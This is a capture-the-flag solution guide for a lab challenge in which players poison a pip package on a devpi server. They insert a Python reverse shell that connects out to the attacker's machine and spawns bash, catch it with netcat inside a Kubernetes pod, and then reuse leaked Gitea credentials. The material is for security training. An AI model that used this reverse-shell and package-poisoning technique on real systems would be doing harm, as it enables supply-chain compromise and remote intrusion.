# Malicious Package

*Solution Guide*

## Overview

From within the gamespace, players access `gitea.merch.codes/work4us` and view the repositories. The Gitea repositories tell the story of the challenge: they contain the code, the database, and the method by which the Work4us spammers are sending email.

## Question 1

*What is the password to get into the custom pip server (devpi)?*

1. Browse to `https://mail.merch.codes` and log in with the provided credentials (`user` | `tiredofspam`). After logging in, you will notice recurring spam emails (**Work for Us!**) arriving from `work4us@merch.codes` to your inbox. All of these emails contain the spammer's Gitea page at the bottom (`gitea.merch.codes/work4us`). 
2. Browse to the spammer's Gitea page.
3. Review the contents in the two repositories available at `gitea.merch.codes/work4us`. In the `Work4UsTemplate` repository, the `README.md` file contains a note with a reference to the IP address `10.1.1.51`. 
4. Browse to `10.1.1.51`, the `devpi` home page. 
5. Click the first bullet point: `emailAdmin/dev`. Notice the package `mailhelper-1.1` and the upload user `emailAdmin` near the bottom.
6. Either check the description of `MailHelper` by clicking `mailhelper-1.1` or downloading the **MailHelper-1.1.tar.gz** file and read the `README.txt`. Both contain the possible passwords for `emailAdmin`. 
7. Use the following  `devpi` commands to test the passwords for `emailAdmin`.

  **devpi commands:**

```bash
devpi use http://10.1.1.51/emailAdmin/dev
devpi login emailAdmin --password="Fill in password here"
```

The correct password is the answer to Question 1.

## Question 2

*After successfully obtaining a reverse shell, provide the flag located under `/opt/script.sh` inside the Kubernetes pod.*

The `python-tool` pod is looping the sending of email messages. The catch is -- it's also pulling down the repository `WorkForUsTemplate` and upgrading the `MailHelper` package. We can use this to our advantage and create a reverse shell. Notice in the `WorkForUsTemplate` repository there's a file called `send_email.py` that is run in the `python-tool` pod by `script.sh`, as mentioned in the description.

1. In the `WorkForUsTemplate` repo, look closely at the `send_email.py` file. Line 17 tells you the function `lookup_subscribers` is being executed. Inside this function is where we will place the reverse shell.
2. Download the `MailSenderHelper` repository from Gitea. In the `MailSenderHelper` repository, click the **More Operations** (three dots) icon on the right and select `Download ZIP`.
3. To unzip, open a terminal and run the following commands: 

```bash
cd /home/user/Downloads
unzip MailSenderHelper-main.zip
cd mailsenderhelper
```

4. To modify the `lookup_subscribers` function, go to the downloaded `mailsenderhelper/mailhelper` directory and edit the file called `mail_sender_helper.py` using your favorite text editor. We'll use `nano` in this solution guide. 

```bash
cd /home/user/Downloads/mailsenderhelper/mailhelper
nano mail_sender_helper.py 
```

**Here is an example of a Python reverse shell in the `mail_sender_helper.py` file. Make sure you enter *your* Kali VM's IP address where indicated in the code below:**

```python
import sqlite3
import socket,subprocess,os
import pty

def lookup_subscribers():
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<<IP OF YOUR KALI VM>>",9001))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  pty.spawn("/bin/bash")
  con = sqlite3.connect("spam.db")
  cur = con.cursor()
  res = cur.execute("SELECT subscribed, email FROM spam")
  subscribed, receiver = res.fetchone()
  return subscribed, receiver
```

5. Now, `mail_sender_helper.py` contains the reverse shell. We need to upload the new package into the **devpi** server for the `python-tool` pod to pick it up. But first, we must increment the version number in the `setup.py` file so it updates and executes your code: 

```bash
cd /home/user/Downloads/mailsenderhelper
nano setup.py
```

  The current version is `1.0`. Change it to `2.0` and save the file. 

6. Uploading the package automatically triggers the reverse shell. Now, open a new terminal and open a listener in port `9001` on your Kali VM.

```bash
nc -lvp 9001
```

7. Once the listener is ready, you can upload the package. Make sure you are not using the "listener" terminal for these steps; use a different terminal. To upload the package to the correct location, you must be in the directory where `setup.py` is and execute `devpi use http://10.1.1.51/emailAdmin/dev`. The commands are:

```bash
cd /home/user/Download/mailsenderhelper
devpi use http://10.1.1.51/emailAdmin/dev
# Please note this is after you authenticate as emailAdmin by finding the password in Question 1
# Make sure you're in the mailsenderhelper package directory
# You need --no-isolation in order to push up to devpi
devpi upload --no-isolation
```

​Shortly after uploading the package, the target connects to your listener and you now have a reverse shell. 

8. Answering Question 2 requires you to look for the flag inside the `/opt/script.sh` file. As you can see, you landed in the `/opt/WorkForUsTemplate/` directory in the new “listening” terminal; therefore, from this terminal, let's back down one directory and read this file.

![](./img/step8.png)

```bash
cd /opt/
cat script.sh
```
These are the contents of the `script.sh` file. `<FLAG_HERE>` is replaced with the flag you are trying to submit.

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: python-tool-script
  namespace: default
data:
  script.sh: |
    #!/bin/bash
    # <FLAG_HERE>
    while true; do
      python3 -m pip install -U -i http://10.1.1.51/emailAdmin/dev/+simple/ --trusted-host 10.1.1.51 mailhelper
      cd /opt
      if [ ! -d "/opt/WorkForUsTemplate" ]; then
         git clone http://work4us:scammersrkewl123@gitea-http:3000/work4us/WorkForUsTemplate.git
         cd /opt/WorkForUsTemplate
      else
         cd /opt/WorkForUsTemplate
         git pull http://work4us:scammersrkewl123@gitea-http:3000/work4us/WorkForUsTemplate.git
      fi
      python3 /opt/WorkForUsTemplate/send_email.py
      sleep 30
    done
```

## Question 3

*Unsubscribe from the email list via the `spam.db` database, commit and push those changes to the `Work4Us` repository, and grade your challenge at `challenge.us` to obtain the last token.*

Note `script.sh` contains the `work4us` user credentials. Let's use those credentials to clone the `Work4UsTemplate` repository, make changes to the `spam.db` database to unsubscribe from the email list, and push our changes *back* to the repository. 

We recommend Python and `sqlite3` to change the `subscribed` value to `'false'` in the database.

1. Copy the `git clone http://work4us:scammersrkewl123@gitea-http:3000/work4us/WorkForUsTemplate.git` command found inside the `script.sh` file.
2. In that same terminal (still inside the pod), paste the `git clone` command you just copied: 

```bash
git clone http://work4us:scammersrkewl123@gitea-http:3000/work4us/WorkForUsTemplate.git
```

> **Note:** If you get an error stating "destination path already exits" perform this step from a different directory like `/home/`.

3. After cloning the repository, make sure you enter the downloaded directory by executing the following command (ensure you go inside the cloned repository and not the `WorkForUsTemplate` directory found inside the `/opt` directory):  

```bash
cd WorkForUsTemplate
```

4. Modify the database. Enter `python` in the terminal inside the pod. 

```bash
python
```

5. Run the following commands to get the correct table: 

```python
import sqlite3
con = sqlite3.connect("spam.db")
cur = con.cursor()
res = cur.execute("SELECT name FROM sqlite_master")
res.fetchone()
```

6. Once you know the correct table, proceed to get all entries inside that table. 

```python
import sqlite3
con = sqlite3.connect("spam.db")
cur = con.cursor()
res = cur.execute("SELECT * FROM spam")
res.fetchone()
```

7. Now, update the user to `false`:

```python
import sqlite3
con = sqlite3.connect("spam.db")
cur = con.cursor()
cur.execute("UPDATE spam SET subscribed = 'false' WHERE email = 'user@merch.codes'")
con.commit()
```

8. After updating the user record, exit Python: 

```python
exit()
```

9. Finally, we need to add and commit these changes to Gitea using the found credentials.

```bash
git add spam.db
git commit -m "Changing DB"
```

**Note on possible Git Commit error:**

When running the  `git commit`, you may see the following error: 

``` 
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'root@python-tool.(none)')
```

If this is the case, run the following commands: 

```bash
git config --global user.email random_user@mail.com
git config --global user.name random_user
```

... and try the commit again. 

```bash
git commit -m "Changing DB"
```

10. After committing the file, push your changes back to the repository using the found credentials. 

```bash
git push http://work4us:scammersrkewl123@gitea-http:3000/work4us/WorkForUsTemplate.git
```

11. Finally, go to `challenge.us` from a gamespace resource and click **Grade**. `challenge.us` checks the `'false'` value. If successful, you will receive the eight hex character token.

The answer to Question 3 is the eight hex character token.
